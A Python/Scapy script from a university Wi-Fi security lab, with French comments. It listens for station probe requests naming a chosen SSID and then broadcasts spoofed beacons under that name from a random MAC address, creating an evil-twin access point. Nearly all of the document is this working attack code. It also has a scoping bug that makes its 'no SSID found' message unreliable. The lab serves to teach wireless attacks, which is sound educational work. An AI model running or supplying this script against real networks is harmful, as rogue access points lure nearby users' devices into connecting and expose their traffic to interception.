"""
Titre: 4_evil_twin_prb_req
Sujet: HEIGVD-SWI23-Labo1-MAC-Sec
Description:
    - Détecte une STA cherchant un SSID particulier
    - proposer un evil twin si le SSID est trouvé
Auteurs:
    - Anthony Coke
    - Guilain Mbayo
    - Mehdi Salhi
Date: 30.03.2023
"""

#!/usr/bin/env python
from scapy.all import *
from faker import Faker
import argparse

# Outil découvert pour le parsing d'arguments en python https://docs.python.org/3/library/argparse.html
# Outil découvert pour la génération d'adresse MAC et SSID aléatoire https://faker.readthedocs.io/en/master/providers/faker.providers.internet.html?highlight=mac%20address#faker.providers.internet.Provider.mac_address

parser = argparse.ArgumentParser()
parser.add_argument("-i", required=True) # Interface
parser.add_argument("-s", required=True) # SSID cible
args = parser.parse_args()


# Développer un script en Python/Scapy capable de detecter une STA cherchant un SSID particulier - proposer un evil twin si le SSID est trouvé (i.e. McDonalds, Starbucks, etc.).
# Pour la détection du SSID, vous devez utiliser Scapy. Pour proposer un evil twin, vous pouvez très probablement réutiliser du code des exercices précédents ou vous servir d'un outil existant.

ssid_found = False

# Fonction appelée sur chaque paquet sniffé
def pkt_handler(pkt):
    if pkt.haslayer(Dot11Elt):
        #Check si c'est une probe request
        if pkt.type == 0 and pkt.subtype == 4:
            print(args.s)
            print("Probe request détectée !")
            print("SSID : ", pkt[Dot11Elt].info)
            ssid = pkt[Dot11Elt].info
            
            if ssid.decode() == args.s:
                ssid_found = True
                evil_twin()
            	
            
        

# Fonction qui envoie un beacon avec le SSID cible
def evil_twin():
    random_mac = Faker().mac_address()
    packet = RadioTap()/Dot11(type=0, subtype=8, addr1='ff:ff:ff:ff:ff:ff', addr2=random_mac, addr3=random_mac)/Dot11Beacon()/Dot11Elt(ID="SSID", info=args.s, len=len(args.s))
    sendp(packet, iface=args.i, inter=0.1, loop=1, verbose=1)

def main():

    # Snif les paquets pour détecter les AP
    print("Sniffing en cours...")
    sniff(timeout=30, iface=args.i, prn = pkt_handler)
    if ssid_found == False:
       print("Aucun SSID n'a été trouvé")
    

    print("Fin du sniffing")

if __name__ == "__main__":
    main()
